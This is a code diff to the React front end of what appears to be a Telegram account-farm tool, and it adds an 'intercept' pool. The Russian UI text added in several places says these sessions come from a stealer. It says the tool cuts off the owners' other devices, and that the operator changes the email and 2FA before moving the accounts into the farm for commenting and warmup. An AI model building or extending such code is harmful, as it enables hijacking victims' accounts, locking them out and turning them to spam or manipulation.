@@ -157,9 +157,10 @@ const guardPauseLabel = (account) => {
   return until.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
 };
 
-const CustomAutomationAccountsPage = () => {
+const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
   const { id } = useParams();
   const { isAdmin } = useCustomAuth();
+  const isIntercept = pool === 'intercept';
   const importInputRef = useRef(null);
   const dragCount = useRef(0);
 
@@ -214,6 +215,7 @@ const CustomAutomationAccountsPage = () => {
         search: filters.search || undefined,
         limit: filters.limit,
         offset: filters.offset,
+        pool,
       });
       setAccounts(data.items || []);
       setTotal(data.total || 0);
@@ -223,7 +225,7 @@ const CustomAutomationAccountsPage = () => {
     } finally {
       setIsLoading(false);
     }
-  }, [id, filters.status, filters.search, filters.limit, filters.offset]);
+  }, [id, filters.status, filters.search, filters.limit, filters.offset, pool]);
 
   useEffect(() => {
     loadAccounts();
@@ -231,12 +233,12 @@ const CustomAutomationAccountsPage = () => {
 
   const loadBanStats = useCallback(async () => {
     try {
-      const data = await customService.getAutomationAccountBanStats(id);
+      const data = await customService.getAutomationAccountBanStats(id, { pool });
       setBanStats(data);
     } catch {
       setBanStats(null);
     }
-  }, [id]);
+  }, [id, pool]);
 
   useEffect(() => {
     loadBanStats();
@@ -416,6 +418,7 @@ const CustomAutomationAccountsPage = () => {
       const result = await customService.bulkUploadAccounts(id, file, {
         proxyId: uploadProxyId,
         proxyLine: uploadProxyLine,
+        pool,
       });
       setUploadSummary({
         created: result.created,
@@ -598,7 +601,11 @@ const CustomAutomationAccountsPage = () => {
     try {
       const data = await customService.adoptAccountSessions(id, account.id);
       setSessionItems(data.items || []);
+      if (isIntercept) {
+        setDrawerId(null);
+      }
       await loadAccounts();
+      await loadBanStats();
     } catch (err) {
       setError(err.message || 'Не удалось перевести аккаунт в общий пул');
     }
@@ -782,10 +789,14 @@ const CustomAutomationAccountsPage = () => {
       {uploadSummary && !prepareStatus ? (
         <p className="acc-flash">
           Залито {uploadSummary.created} сессий.
-          {' '}
-          <button type="button" className="acc-btn acc-btn--primary" onClick={handlePrepare} disabled={isPreparing}>
-            {isPreparing ? 'Подготовка...' : 'Подготовить профили и вступить в чаты'}
-          </button>
+          {isIntercept ? ' Чужие устройства сбрасываем сами. Когда останется одна сессия — переведите аккаунт в общий пул.' : (
+            <>
+              {' '}
+              <button type="button" className="acc-btn acc-btn--primary" onClick={handlePrepare} disabled={isPreparing}>
+                {isPreparing ? 'Подготовка...' : 'Подготовить профили и вступить в чаты'}
+              </button>
+            </>
+          )}
         </p>
       ) : null}
 
@@ -811,10 +822,12 @@ const CustomAutomationAccountsPage = () => {
           <Ico d="M12 3v12M8 11l4 4 4-4M4 21h16" />
           Импортировать аккаунты
         </button>
-        <button type="button" className="acc-btn acc-btn--ghost" onClick={() => { setDrawerId(null); setPanel('add'); }}>
-          <Ico><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M19 8v6M16 11h6" /></Ico>
-          Добавить аккаунт
-        </button>
+        {isIntercept ? null : (
+          <button type="button" className="acc-btn acc-btn--ghost" onClick={() => { setDrawerId(null); setPanel('add'); }}>
+            <Ico><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M19 8v6M16 11h6" /></Ico>
+            Добавить аккаунт
+          </button>
+        )}
         <button type="button" className="acc-btn acc-btn--mint" onClick={() => { setDrawerId(null); setPanel('proxy'); }}>
           <Ico><rect x="2" y="7" width="20" height="14" rx="2" /><path d="M16 7V5a4 4 0 0 0-8 0v2" /></Ico>
           Пул прокси
@@ -840,15 +853,19 @@ const CustomAutomationAccountsPage = () => {
             >
               <Ico d="M4 4h16l-6 8v6l-4 2v-8L4 4z" />
             </button>
-            <button type="button" className="acc-icon-btn" title="Профили" onClick={() => { setDrawerId(null); setPanel('profiles'); }}>
-              <Ico><rect x="3" y="4" width="18" height="16" rx="2" /><path d="M7 8h10M7 12h6" /></Ico>
-            </button>
+            {isIntercept ? null : (
+              <button type="button" className="acc-icon-btn" title="Профили" onClick={() => { setDrawerId(null); setPanel('profiles'); }}>
+                <Ico><rect x="3" y="4" width="18" height="16" rx="2" /><path d="M7 8h10M7 12h6" /></Ico>
+              </button>
+            )}
             <button type="button" className="acc-icon-btn" title="Проверить сессии" onClick={handleHealthCheck} disabled={isHealthChecking}>
               <Ico><path d="M21 12a9 9 0 1 1-3-6.7" /><path d="M21 3v6h-6" /></Ico>
             </button>
-            <Link className="acc-icon-btn" title="Прогрев аккаунтов" to={warmupPath}>
-              <Ico d="M13 2 3 14h9l-1 8 10-12h-9l1-8z" />
-            </Link>
+            {isIntercept ? null : (
+              <Link className="acc-icon-btn" title="Прогрев аккаунтов" to={warmupPath}>
+                <Ico d="M13 2 3 14h9l-1 8 10-12h-9l1-8z" />
+              </Link>
+            )}
             <button
               type="button"
               className="acc-icon-btn"
@@ -869,12 +886,16 @@ const CustomAutomationAccountsPage = () => {
                     onChange={(event) => setFilters((prev) => ({ ...prev, status: event.target.value, offset: 0 }))}
                   />
                 </div>
-                <Link className="acc-btn acc-btn--ghost" to={ubtModulePath(id, 'warmup')}>Прогрев</Link>
-                {isAdmin && !warmupEnabled ? (
-                  <button type="button" className="acc-btn acc-btn--ghost" onClick={handleStartWarmup} disabled={isStartingWarmup}>
-                    {isStartingWarmup ? 'Включаем...' : 'Включить для новых заливов'}
-                  </button>
-                ) : null}
+                {isIntercept ? null : (
+                  <>
+                    <Link className="acc-btn acc-btn--ghost" to={ubtModulePath(id, 'warmup')}>Прогрев</Link>
+                    {isAdmin && !warmupEnabled ? (
+                      <button type="button" className="acc-btn acc-btn--ghost" onClick={handleStartWarmup} disabled={isStartingWarmup}>
+                        {isStartingWarmup ? 'Включаем...' : 'Включить для новых заливов'}
+                      </button>
+                    ) : null}
+                  </>
+                )}
               </div>
             ) : null}
           </div>
@@ -893,18 +914,22 @@ const CustomAutomationAccountsPage = () => {
                 <Ico><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" /><path d="M7 10l5 5 5-5" /></Ico>
               </span>
             </div>
-            <p className="acc-empty-kicker">Telegram-комбайн</p>
-            <h2>Здесь появятся ваши аккаунты</h2>
+            <p className="acc-empty-kicker">{isIntercept ? 'Перехват аккаунтов' : 'Telegram-комбайн'}</p>
+            <h2>{isIntercept ? 'Отдельный пул перехваченных сессий' : 'Здесь появятся ваши аккаунты'}</h2>
             <p>
-              Перетащите файлы прямо сюда или импортируйте вручную — комбайн подхватит сессии сам.
+              {isIntercept
+                ? 'Сюда заливаются сессии из стилера. Они не комментят и не идут в прогрев фермы, пока вы не переведёте их в общий пул.'
+                : 'Перетащите файлы прямо сюда или импортируйте вручную — комбайн подхватит сессии сам.'}
             </p>
             <div className="acc-empty-actions">
               <button type="button" className="acc-btn acc-btn--primary" onClick={() => importInputRef.current?.click()} disabled={isUploading}>
                 Импортировать аккаунты
               </button>
-              <button type="button" className="acc-btn acc-btn--ghost" onClick={() => { setDrawerId(null); setPanel('add'); }}>
-                Добавить вручную
-              </button>
+              {isIntercept ? null : (
+                <button type="button" className="acc-btn acc-btn--ghost" onClick={() => { setDrawerId(null); setPanel('add'); }}>
+                  Добавить вручную
+                </button>
+              )}
             </div>
             <div className="acc-formats">
               <b>Форматы</b>
@@ -1041,13 +1066,15 @@ const CustomAutomationAccountsPage = () => {
             <div className="acc-drawer-head">
               <div>
                 <h2>
-                  {panel === 'import' && 'Импорт аккаунтов'}
+                  {panel === 'import' && (isIntercept ? 'Импорт перехваченных сессий' : 'Импорт аккаунтов')}
                   {panel === 'add' && 'Добавить аккаунт'}
                   {panel === 'proxy' && 'Пул прокси'}
                   {panel === 'profiles' && 'Массовое обновление профилей'}
                 </h2>
                 <p>
-                  {panel === 'import' && 'ZIP с .session, одиночный .session или CSV.'}
+                  {panel === 'import' && (isIntercept
+                    ? 'ZIP или .session из стилера. Чужие устройства обрываем сразу. В общий пул — когда останется только наша сессия.'
+                    : 'ZIP с .session, одиночный .session или CSV.')}
                   {panel === 'add' && 'QR или код из SMS. 2FA — если включена.'}
                   {panel === 'proxy' && 'Список для автоназначения при заливе и подключении.'}
                   {panel === 'profiles' && 'Имя, bio и аватар сразу на пачку аккаунтов.'}
@@ -1209,8 +1236,9 @@ const CustomAutomationAccountsPage = () => {
                   </button>
                 </div>
                 <p className="form-hint">
-                  Пока аккаунт в работе, новые входы сразу обрываем. Код из Telegram даёт 5 минут на ваш вход.
-                  После перевязки почты и 2FA нажмите «Перевести в общий пул» — текущие устройства станут своими.
+                  {isIntercept
+                    ? 'Все чужие устройства обрываем сразу, оставляем только эту сессию. Пауза 15 минут — если входите с телефона, чтобы сменить почту и 2FA. Когда останется одна сессия, нажмите «Перевести в общий пул».'
+                    : 'Пока аккаунт в работе, новые входы сразу обрываем. Код из Telegram даёт 5 минут на ваш вход. «Зафиксировать устройства» запоминает текущий список как свои.'}
                   {guardPauseLabel(drawerAccount) ? ` Пауза до ${guardPauseLabel(drawerAccount)}.` : ''}
                 </p>
                 {sessionsLoading ? <p className="form-hint">Загружаем устройства...</p> : null}
@@ -1266,7 +1294,7 @@ const CustomAutomationAccountsPage = () => {
                   Я вхожу сам (15 мин)
                 </button>
                 <button type="button" className="acc-btn acc-btn--dark" onClick={() => handleAdoptSessions(drawerAccount)}>
-                  Перевести в общий пул
+                  {isIntercept ? 'Перевести в общий пул' : 'Зафиксировать устройства'}
                 </button>
                 <button type="button" className="acc-btn acc-btn--ghost" onClick={() => handleDeleteAccount(drawerAccount)}>
                   Удалить
